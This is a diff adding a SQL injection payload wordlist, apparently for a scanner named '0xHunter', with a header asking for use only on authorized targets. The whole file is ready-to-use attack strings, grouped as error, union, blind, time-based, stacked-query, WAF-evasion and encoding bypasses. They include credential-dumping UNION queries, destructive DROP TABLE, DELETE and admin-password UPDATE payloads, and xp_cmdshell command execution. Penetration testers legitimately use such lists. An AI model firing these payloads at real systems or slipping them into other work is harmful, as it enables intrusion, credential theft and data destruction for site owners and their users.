@@ -1,0 +1,221 @@
+# 0xHunter SQL Injection Payloads
+# Tests for various SQL injection vectors
+# Use responsibly and only on authorized targets
+
+# Error-Based Detection
+'
+"
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1' --
+" OR "1"="1" --
+' OR 1=1#
+" OR 1=1#
+' OR '1'='1' /*
+" OR "1"="1" /*
+
+# Union-Based
+' UNION SELECT NULL--
+" UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+" UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT username,password FROM users--
+
+# Boolean-Based / Time-Based
+' AND 1=1--
+' AND 1=2--
+" AND 1=1--
+" AND 1=2--
+' AND SLEEP(5)--
+" AND SLEEP(5)--
+' AND pg_sleep(5)--
+" AND pg_sleep(5)--
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' WAITFOR DELAY '0:0:5'--
+; WAITFOR DELAY '0:0:5'--
+' AND 1=1 AND SLEEP(5)--
+
+# Stacked Queries
+'; DROP TABLE users--
+"; DROP TABLE users--
+'; DELETE FROM users--
+"; DELETE FROM users--
+'; INSERT INTO users VALUES ('hacker','pass')--
+
+# Comment Variations
+'--
+"--
+' /*
+" /*
+' #
+" #
+'-- -
+"-- -
+'--+
+"--+
+
+# Encoding Bypasses
+%27
+%22
+%27%20OR%20%271%27%3D%271
+%22%20OR%20%221%22%3D%221
+
+# WAF Evasion
+'/**/OR/**/'1'='1
+'/**/OR/**/1=1--
+' OR 1=1-- -
+' OR 1=1#-
+' OR 1=1/*-
+' OR 1=1;%00
+' OR 1=1 AND '1'='1
+' oR '1'='1
+' Or '1'='1
+' OR '1'='1' AND 1=1--
+
+# Database-Specific
+' AND @@version--
+" AND @@version--
+' AND version()--
+" AND version()--
+' AND sqlite_version()--
+" AND sqlite_version()--
+' AND banner FROM v$version--
+" AND banner FROM v$version--
+
+# Blind SQLi
+' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
+' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>64--
+' AND (SELECT COUNT(*) FROM users)>0--' OR 1=1--
+' OR 1=1#
+' OR '1'='1
+admin'--
+' OR 1=1 LIMIT 1--
+') OR ('1'='1
+' OR ''='
+" OR "1"="1
+" OR 1=1--
+") OR ("1"="1
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT @@version,NULL--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT NULL,@@version--
+' UNION SELECT NULL,@@version,NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT NULL,user()--
+' UNION SELECT database(),NULL--
+' UNION SELECT NULL,database()--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' AND SLEEP(5)--
+' AND SLEEP(5)#
+1 AND SLEEP(5)
+1;SELECT SLEEP(5)
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+' AND 1=1--
+' AND 1=2--
+' AND '1'='1
+' AND '1'='2
+1' AND 1=1#
+1' AND 1=2#
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))--
+' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)--
+'||(SELECT 0x41424344)||'
+'||(SELECT 0x41 FROM DUAL)||'
+'+(SELECT 0x41424344)+'
+' AND 1=CONVERT(int,@@version)--
+' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+'; EXEC xp_cmdshell('whoami')--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+'; EXEC master..xp_cmdshell('whoami')--
+' AND 1=1 UNION SELECT NULL,NULL,NULL,NULL--
+' HAVING 1=1--
+' GROUP BY 1--
+' GROUP BY 1,2--
+' GROUP BY 1,2,3--
+1' GROUP BY 1,2--
+1 GROUP BY 1,2,3,4--
+' OR 1=1 ORDER BY 1--
+') OR 1=1--
+')) OR 1=1--
+' OR 'x'='x
+' OR 1=1 AND ''='
+' OR 1=1 AND 'x'='x
+' OR 2>1--
+' OR 1<2--
+' OR 'text'='text'--
+0 OR 1=1
+0 OR 1=1--
+0 OR 1=1#
+0) OR 1=1--
+0) OR 1=1#
+0)) OR 1=1--
+0;SELECT @@version
+0;SELECT SLEEP(5)
+0;SELECT pg_sleep(5)
+'; SELECT * FROM users--
+'; SELECT username,password FROM users--
+' UNION SELECT username,password FROM users--
+' UNION SELECT 1,username,password FROM users--
+' UNION SELECT 1,2,username FROM users--
+1 OR 1=1
+1 OR 1=1--
+1 OR 1=1#
+1) OR 1=1--
+1') OR '1'='1
+1" OR "1"="1
+1") OR ("1"="1
+1' OR '1'='1
+1 AND 1=2 UNION SELECT 1,2,3--
+1 AND 1=2 UNION SELECT 1,2,3,4--
+' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))s FROM information_schema.tables LIMIT 1),8446744073709551610,8446744073709551610)))--
+' AND extractvalue(1,concat(0x7e,(select database())))--
+' AND row(1,1)>(SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)--
+'; INSERT INTO users(username,password) VALUES('hacker','hacked')--
+'; UPDATE users SET password='hacked' WHERE username='admin'--
+'; DELETE FROM users WHERE 1=1--
+'; DROP TABLE users--
+'; CREATE TABLE pwned(id INT)--
+'%20OR%201=1--
+'%09OR%091=1--
+'%0aOR%0a1=1--
+'\''OR 1=1--
+\'OR 1=1--
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+1 AND 1=1
+1 AND 1=2
+1 AND 1=1--
+1 AND 1=2--
+1; SELECT @@version
+1; SELECT user()
+1; SELECT database()
+1; SELECT table_name FROM information_schema.tables
+1; SELECT column_name FROM information_schema.columns
+0'; SELECT SLEEP(5)--
+0"; SELECT SLEEP(5)--
+0`; SELECT SLEEP(5)--
+' OR 1=1 UNION ALL SELECT NULL--
+' OR 1=1 UNION ALL SELECT NULL,NULL--
+' OR 1=1 UNION ALL SELECT NULL,NULL,NULL--
